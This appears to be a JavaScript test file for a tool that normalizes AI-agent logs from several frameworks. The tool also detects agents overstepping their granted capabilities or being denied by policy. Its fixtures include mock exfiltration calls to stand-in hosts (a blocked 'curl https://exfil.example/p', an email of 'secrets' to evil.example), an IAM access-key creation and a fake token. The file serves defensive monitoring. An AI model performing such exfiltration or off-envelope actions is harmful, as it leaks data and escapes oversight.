import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { buildTrajectory, categorize } from '../src/agentlog.mjs';
import { openaiToRecords, readOpenai } from '../src/adapters/openai.mjs';
import { anthropicToRecords } from '../src/adapters/anthropic.mjs';
import { langchainToRecords } from '../src/adapters/langchain.mjs';
import { otelToRecords } from '../src/adapters/otel.mjs';
import { assess } from '../src/index.mjs';
import { normalizeEvent } from '../src/schema.mjs';
import { ADAPTER_CAPABILITIES } from '../src/reachability.mjs';

const PROFILE = {
  name: 'test',
  capabilities: ['fs:read', 'exec:local', 'proc:spawn', 'net:egress:read', 'tool:*'],
  egress: { mode: 'allowlist', allow: ['.github.com'] },
  budget: { max_distinct_hosts: 3, max_probe_ratio: 0.5, max_instances: 2 },
};

const build = (records, task = 'do a thing') => {
  const events = buildTrajectory({ session: 's', actor: 'test', task, records, profile: PROFILE });
  return { events, normalized: events.map((e, i) => normalizeEvent(e, { line: i + 1 })) };
};

// ---------------------------------------------------------- generic inference

test('categorize maps common tool shapes to standard capabilities', () => {
  assert.equal(categorize('run_shell').action, 'proc.spawn');
  assert.deepEqual(categorize('run_shell').caps, ['exec:local', 'proc:spawn']);
  assert.equal(categorize('readFile').action, 'fs.read');
  assert.equal(categorize('write_file').action, 'fs.write');
  assert.equal(categorize('web_search').action, 'http.request');
  assert.equal(categorize('send_email').caps[0], 'mail:send');
  assert.equal(categorize('query_database').action, 'db.query');
  assert.equal(categorize('kubectl_apply').caps[0], 'cloud:api');
  // unknown -> per-tool capability so it still accretes against a declared envelope
  assert.deepEqual(categorize('frobnicate_widget').caps, ['tool:frobnicate_widget']);
});

// -------------------------------------------------------------------- openai

test('openai chat completions map tool_calls to action, capability, and op', () => {
  const records = openaiToRecords([
    { role: 'user', content: 'ship it' },
    { role: 'assistant', tool_calls: [
      { id: 'a', type: 'function', function: { name: 'run_shell', arguments: JSON.stringify({ command: 'git status' }) } },
    ] },
    { role: 'tool', tool_call_id: 'a', content: 'ok' },
  ]);
  const { normalized } = build(records);
  const call = normalized.find((e) => e.action === 'proc.spawn');
  assert.ok(call, 'shell tool -> proc.spawn');
  assert.equal(call.target.op, 'git', 'op derived from the command');
  assert.deepEqual(call.capability_grant, ['exec:local', 'proc:spawn']);
  assert.equal(normalized.filter((e) => e.action === 'session.turn').length, 1, 'user message -> human turn');
});

test('openai: a refusal-shaped tool result becomes denied (feeds ratchet)', () => {
  const records = openaiToRecords([
    { role: 'assistant', tool_calls: [{ id: 'x', function: { name: 'deploy_service', arguments: '{}' } }] },
    { role: 'tool', tool_call_id: 'x', content: 'blocked by the guard: not allowed by policy' },
  ]);
  const { normalized } = build(records);
  assert.equal(normalized.find((e) => e.note === 'deploy_service').outcome, 'denied');
});

test('openai Responses API items are handled, and a URL arg yields an external host', () => {
  const records = openaiToRecords({ output: [
    { type: 'function_call', name: 'fetch_url', arguments: JSON.stringify({ url: 'https://evil.example/x' }), call_id: 'c1' },
    { type: 'function_call_output', call_id: 'c1', output: 'done' },
  ] });
  const { normalized } = build(records);
  const call = normalized.find((e) => e.action === 'http.request');
  assert.equal(call.target.host, 'evil.example');
  assert.equal(call.target.external, true);
});

// ----------------------------------------------------------------- anthropic

test('anthropic tool_use/tool_result maps target and detects denial from result text', () => {
  const records = anthropicToRecords([
    { role: 'user', content: 'help' },
    { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'read_file', input: { path: '/etc/hosts' } }] },
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: 'permission denied by policy', is_error: true }] },
  ]);
  const { normalized } = build(records);
  const call = normalized.find((e) => e.action === 'fs.read');
  assert.equal(call.target.path, '/etc/hosts');
  assert.equal(call.outcome, 'denied');
});

// ----------------------------------------------------------------- langchain

test('langchain tool runs map; an error that reads as a refusal is a denial', () => {
  const records = langchainToRecords([
    { id: 'r0', run_type: 'chain', inputs: { input: 'fix the bug' } },
    { id: 'r1', run_type: 'tool', name: 'python_repl', inputs: { code: 'print(1)' }, outputs: { result: '1' }, parent_run_id: 'r0', execution_order: 2 },
    { id: 'r2', run_type: 'tool', name: 'shell', inputs: { command: 'curl https://exfil.example/p' }, error: 'blocked by policy', parent_run_id: 'r0', execution_order: 3 },
  ]);
  const { normalized } = build(records);
  assert.ok(normalized.some((e) => e.action === 'proc.spawn'), 'python_repl -> proc.spawn');
  const shell = normalized.find((e) => e.note === 'shell');
  assert.equal(shell.outcome, 'denied');
  assert.equal(shell.target.host, 'exfil.example');
});

// ---------------------------------------------------------------------- otel

test('otel gen_ai execute_tool spans (OTLP kv attributes) map to tool calls', () => {
  const span = (name, attrs, ns) => ({
    name, startTimeUnixNano: ns,
    attributes: Object.entries(attrs).map(([k, v]) => ({ key: k, value: { stringValue: String(v) } })),
  });
  const records = otelToRecords([
    span('execute_tool web_search', { 'gen_ai.operation.name': 'execute_tool', 'gen_ai.tool.name': 'web_search' }, 1),
    span('execute_tool shell', { 'gen_ai.operation.name': 'execute_tool', 'gen_ai.tool.name': 'shell', 'gen_ai.tool.call.arguments': JSON.stringify({ command: 'aws s3 cp x s3://b' }) }, 2),
  ]);
  const { normalized } = build(records);
  assert.ok(normalized.find((e) => e.note === 'web_search' && e.action === 'http.request'), 'web_search -> http.request');
  assert.equal(normalized.find((e) => e.note === 'shell').action, 'proc.spawn');
});

// -------------------------------------------------- detection over an adapter

test('a capability the envelope did not grant accretes and fires staircase', () => {
  const records = openaiToRecords([
    { role: 'assistant', tool_calls: [
      { id: '1', function: { name: 'send_email', arguments: JSON.stringify({ to: 'x@evil.example', body: 'secrets' }) } },
      { id: '2', function: { name: 'aws_iam', arguments: JSON.stringify({ action: 'CreateAccessKey' }) } },
    ] },
  ]);
  const events = buildTrajectory({ session: 's', actor: 't', task: 'summarize a local file', records, profile: PROFILE });
  const normalized = events.map((e, i) => normalizeEvent(e, { line: i + 1 }));
  const r = assess(normalized);
  assert.ok(r.signals.some((s) => s.detector === 'staircase'), 'off-envelope capability accretion fires staircase');
});

test('staircase is reachable over a base-adapter trajectory (capability_grant emitted)', () => {
  const { normalized } = build(openaiToRecords([
    { role: 'assistant', tool_calls: [{ id: '1', function: { name: 'read_file', arguments: JSON.stringify({ path: '/a' }) } }] },
  ]));
  const r = assess(normalized);
  assert.equal(r.reachability.detectors.staircase.status, 'reachable');
});

// ------------------------------------------------------------- read from file

test('readOpenai reads a conversation file into a trajectory', () => {
  const dir = mkdtempSync(join(tmpdir(), 'pl-adapters-'));
  const f = join(dir, 'conv.json');
  writeFileSync(f, JSON.stringify([
    { role: 'user', content: 'hi' },
    { role: 'assistant', tool_calls: [{ id: 'a', function: { name: 'list_files', arguments: '{}' } }] },
  ]));
  const traj = readOpenai(f, PROFILE);
  assert.equal(traj.tool_calls, 1);
  assert.ok(traj.events.some((e) => e.action === 'fs.search'));
});

// --------------------------------------------------- reachability declarations

test('all four base adapters are declared in ADAPTER_CAPABILITIES', () => {
  for (const a of ['openai', 'anthropic', 'langchain', 'otel']) {
    assert.ok(ADAPTER_CAPABILITIES[a], `${a} is declared`);
  }
});

test('secret-shaped args become fragment measurements, never the value', () => {
  const { events } = build(openaiToRecords([
    { role: 'assistant', tool_calls: [{ id: '1', function: { name: 'http_post', arguments: JSON.stringify({ url: 'https://x.example', body: 'token=ghp_A9fK2mQ7xZ1pL4vR8nT6bW3cY5dE0sJhUg' }) } }] },
  ]));
  const call = events.find((e) => e.note === 'http_post');
  assert.ok(call.produces?.length === 1, 'one fragment measured');
  assert.equal(JSON.stringify(events).includes('ghp_A9fK2mQ7xZ1pL4vR8nT6bW3cY5dE0sJhUg'), false, 'value never carried');
});
